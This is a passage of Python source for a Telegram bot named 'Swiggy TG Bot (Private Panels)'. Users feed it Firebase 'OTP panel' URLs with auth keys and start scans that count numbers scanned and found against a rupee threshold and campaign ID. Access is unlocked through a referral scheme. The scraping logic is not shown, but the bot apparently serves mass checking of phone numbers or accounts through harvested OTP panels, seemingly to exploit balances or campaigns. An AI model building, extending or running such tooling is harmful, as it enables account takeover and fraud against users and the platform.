async def stop_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    us = await session_manager.get(uid)

    if not us.is_running:
        await update.message.reply_text("ℹ️ No scan running.")
        return

    for task_id, task in list(us.running_tasks.items()):
        task.cancel()
    us.running_tasks.clear()
    us.is_running = False

    await update.message.reply_text(
        f"⏹ *Scan Stopped!*
"
        f"📱 Scanned: {us.total_scanned}
"
        f"✅ Found: {us.total_found}",
        parse_mode="Markdown",
    )

# ── Add My Panel ───────────────────────────────────────────────────────────────
async def handle_add_my_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id

    if uid not in ADMIN_IDS and not has_access(uid):
        await update.message.reply_text("⛔ Access expired. Share your referral link to unlock!")
        return

    await update.message.reply_text(
        "➕ *Add YOUR Panel*

"
        "Apna Firebase panel link bhejo:
"
        "• Raw: `https://xxx-default-rtdb.firebaseio.com`
"
        "• With auth: `https://xxx.firebaseio.com?auth=KEY`
"
        "• Encoded: `https://panel.site/?s=...`
"
        "• Merge: `https://free-otp-panel.vercel.app/#merge=...`

"
        "🔒 *Sirf tumhara panel hai — koi aur use nahi karega.*

"
        "Multiple links = one per line",
        parse_mode="Markdown",
    )
    context.user_data["awaiting_add_my_panel"] = True

# ── Remove My Panel ────────────────────────────────────────────────────────────
async def handle_remove_my_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    my_panels = get_user_panels(uid)

    if not my_panels:
        await update.message.reply_text("❌ Tumhare paas koi panel nahi hai.")
        return

    text = "❌ *Remove YOUR Panel*

"
    plist = []
    for i, (pk, pc) in enumerate(my_panels.items(), 1):
        text += f"{i}. {pc.get('name')}
"
        plist.append(pk)
    text += "

Send number to remove."
    context.user_data["awaiting_remove_my_panel"] = True
    context.user_data["my_panels_list"] = plist
    await update.message.reply_text(text, parse_mode="Markdown")

# ── My Panels ──────────────────────────────────────────────────────────────────
async def my_panels_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    my_panels = get_user_panels(uid)

    if not my_panels:
        await update.message.reply_text(
            "❌ *Koi panel nahi hai.*

"
            "➕ *Add My Panel* dabao aur apna link add karo.",
            parse_mode="Markdown",
        )
        return

    text = "📋 *Your Panels*
━━━━━━━━━━━━━━━━━━━━━━

"
    for i, (pk, pc) in enumerate(my_panels.items(), 1):
        api_url = pc.get("api_url", "")[:45]
        text += f"*{i}. {pc.get('name')}*
  API: `{api_url}...`

"
    text += "🔒 Yeh sirf tumhare hain — koi aur nahi dekh sakta."
    await update.message.reply_text(text, parse_mode="Markdown")

# ── My Status ──────────────────────────────────────────────────────────────────
async def my_status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    us = await session_manager.get(uid)
    my_panels = get_user_panels(uid)

    text = (
        f"📊 *Your Status*
"
        f"━━━━━━━━━━━━━━━━━━━━━━
"
        f"📦 Your Panels: {len(my_panels)}
"
        f"🔄 Scan Running: {'✅ Yes' if us.is_running else '❌ No'}
"
    )
    if us.is_running:
        text += (
            f"📱 Scanned: {us.total_scanned}
"
            f"✅ Found: {us.total_found}
"
            f"🧵 Workers: {DEFAULT_WORKERS}
"
        )
    text += f"━━━━━━━━━━━━━━━━━━━━━━"
    await update.message.reply_text(text, parse_mode="Markdown")

# ── My Referral ────────────────────────────────────────────────────────────────
async def my_referral_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    u = get_user(uid)
    refs = u.get("referrals_given", 0) if u else 0
    bot_info = await context.bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start=r{uid}"
    next_milestone = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)

    await update.message.reply_text(
        f"🔗 *Your Referral*
"
        f"━━━━━━━━━━━━━━━━━━━━━━
"
        f"Total: *{refs}*
"
        f"Next 1h access in: *{next_milestone}* more referral(s)

"
        f"📲 Link:
`{ref_link}`

"
        f"ℹ️ Har 3 referrals = 1 ghante ka access!
"
        f"Share karo aur bot unlock karo 🚀",
        parse_mode="Markdown",
    )

# ── My Access ──────────────────────────────────────────────────────────────────
async def my_access_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in ADMIN_IDS:
        await update.message.reply_text("♾ *Admin — Unlimited access!*", parse_mode="Markdown")
        return
    u = get_user(uid)
    expiry = u.get("access_expiry", 0) if u else 0
    refs = u.get("referrals_given", 0) if u else 0
    if expiry > time.time():
        remaining = int(expiry - time.time())
        hours, rem = divmod(remaining, 3600)
        mins = rem // 60
        exp_str = datetime.fromtimestamp(expiry).strftime("%H:%M %d/%m/%Y")
        await update.message.reply_text(
            f"✅ *Access Active*
"
            f"Expires: `{exp_str}`
"
            f"Remaining: `{hours}h {mins}m`
"
            f"Referrals: `{refs}`",
            parse_mode="Markdown",
        )
    else:
        needed = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)
        await update.message.reply_text(
            f"⛔ *No Access*
"
            f"Referrals: `{refs}`
"
            f"Aur *{needed}* more = 1 ghanta access

"
            f"🔗 Use /start to get your referral link",
            parse_mode="Markdown",
        )

# ── Text message router ───────────────────────────────────────────────────────
async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    uid = update.effective_user.id

    # ── Scan settings ─────────────────────────────────────────────────────────
    if context.user_data.get("awaiting_scan_settings"):
        context.user_data.pop("awaiting_scan_settings")
        panel_key = context.user_data.get("selected_panel")
        if not panel_key:
            await update.message.reply_text("❌ Panel not selected. Try again.")
            return

        if text.lower() == "default":
            threshold = DEFAULT_THRESHOLD
            campaign_id = DEFAULT_CAMPAIGN_ID
            sender = DEFAULT_SENDER
        else:
            parts = text.strip().split()
            threshold = DEFAULT_THRESHOLD
            campaign_id = DEFAULT_CAMPAIGN_ID
            sender = DEFAULT_SENDER
            try:
                if len(parts) >= 1:
                    threshold = int(parts[0])
                if len(parts) >= 2:
                    campaign_id = parts[1]
                if len(parts) >= 3:
                    sender = parts[2]
            except ValueError:
                await update.message.reply_text(
                    "❌ Invalid format. Use: `threshold campaign_id sender` or `default`",
                    parse_mode="Markdown",
                )
                return

        asyncio.create_task(
            run_scraper(uid, context.application, panel_key, sender, campaign_id, threshold)
        )
        await update.message.reply_text(
            f"🚀 *Scan Started!*

"
            f"Threshold: ₹{threshold}
"
            f"Campaign: `{campaign_id}`
"
            f"Sender: {sender}
"
            f"Workers: {DEFAULT_WORKERS}

"
            f"You'll get progress updates. Use ⏹ Stop Scan to cancel.",
            parse_mode="Markdown",
        )
        return

    # ── Add My Panel flow ─────────────────────────────────────────────────────
    if context.user_data.get("awaiting_add_my_panel"):
        context.user_data.pop("awaiting_add_my_panel")
        if uid not in ADMIN_IDS and not has_access(uid):
            await update.message.reply_text("⛔ Access expired!")
            return

        links = [line.strip() for line in text.split("
") if line.strip()]
        if not links:
            await update.message.reply_text("❌ Link nahi mila.")
            return

        added = 0
        failed = []
        my_panels = get_user_panels(uid)
        existing_urls = {pc.get("api_url", "").rstrip("/").lower() for pc in my_panels.values()}

        for link in links:
            if not link.startswith("http"):
                if "#merge=" in link:
                    link = "https://free-otp-panel.vercel.app/" + link
                else:
                    failed.append(link[:40])
                    continue

            # Merge URL — expand to multiple panels
            parsed_link = urllib.parse.urlparse(link)
            if parsed_link.fragment.startswith("merge="):
                merge_list = decode_merge_panels(link)
                if not merge_list:
                    failed.append(link[:40])
                    continue
                for api_url, auth_key in merge_list:
                    normalised = api_url.rstrip("/").lower()
                    if normalised in existing_urls:
                        continue  # skip dupes silently
                    add_user_panel(uid, {
                        "name": f"Panel {len(my_panels) + added + 1}",
                        "api_url": api_url,
                        "auth_key": auth_key,
                        "panel_url": link,
                        "added_date": datetime.now().strftime("%Y-%m-%d"),
                    })
                    existing_urls.add(normalised)
                    added += 1
                continue

            # Regular URL
            api_url, auth_key = get_panel_api_url(link)
            if not api_url:
                failed.append(link[:40])
                continue

            normalised = api_url.rstrip("/").lower()
            if normalised in existing_urls:
                continue

            add_user_panel(uid, {
                "name": f"Panel {len(my_panels) + added + 1}",
                "api_url": api_url,
                "auth_key": auth_key,
                "panel_url": link,
                "added_date": datetime.now().strftime("%Y-%m-%d"),
            })
            existing_urls.add(normalised)
            added += 1

        msg = f"✅ *{added} panel(s) added to YOUR account!*"
        if failed:
            msg += f"
❌ Failed ({len(failed)}):
" + "
".join(f"  • {f}" for f in failed)
        msg += "
🔒 Sirf tum use kar sakte ho — koi aur nahi."
        await update.message.reply_text(msg, parse_mode="Markdown")
        return

    # ── Remove My Panel flow ──────────────────────────────────────────────────
    if context.user_data.get("awaiting_remove_my_panel"):
        context.user_data.pop("awaiting_remove_my_panel")
        plist = context.user_data.pop("my_panels_list", [])
        try:
            idx = int(text) - 1
            if 0 <= idx < len(plist):
                my_panels = get_user_panels(uid)
                removed_name = my_panels.get(plist[idx], {}).get("name", "Unknown")
                remove_user_panel(uid, plist[idx])
                await update.message.reply_text(f"✅ Panel '{removed_name}' removed from your account!")
            else:
                await update.message.reply_text("❌ Wrong number!")
        except ValueError:
            await update.message.reply_text("❌ Invalid input!")
        return

    # ── Menu button routing ───────────────────────────────────────────────────
    if text in ("🔍 Start Scan", "Start Scan"):
        await start_scan(update, context)
    elif text in ("⏹ Stop Scan", "Stop Scan"):
        await stop_scan(update, context)
    elif text in ("➕ Add My Panel", "Add My Panel"):
        await handle_add_my_panel(update, context)
    elif text in ("❌ Remove My Panel", "Remove My Panel"):
        await handle_remove_my_panel(update, context)
    elif text in ("📋 My Panels", "My Panels"):
        await my_panels_command(update, context)
    elif text in ("📊 My Status", "My Status"):
        await my_status_command(update, context)
    elif text in ("🔗 My Referral", "My Referral"):
        await my_referral_command(update, context)
    elif text in ("⏳ My Access", "My Access"):
        await my_access_command(update, context)

# ── Main ───────────────────────────────────────────────────────────────────────
async def main():
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        logger.error("BOT_TOKEN not set!")
        sys.exit(1)

    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CallbackQueryHandler(check_join_callback, pattern="^check_join$"))
    application.add_handler(CallbackQueryHandler(panel_selected_callback, pattern="^panel_"))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))

    logger.info("🛒 Swiggy TG Bot (Private Panels) starting...")
    async with application:
        await application.initialize()
        await application.start()
        await application.updater.start_polling(allowed_updates=Update.ALL_TYPES)
        while True:
            await asyncio.sleep(1)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        pass
    except Exception as e:
        logger.fatal(f"Fatal error: {e}")
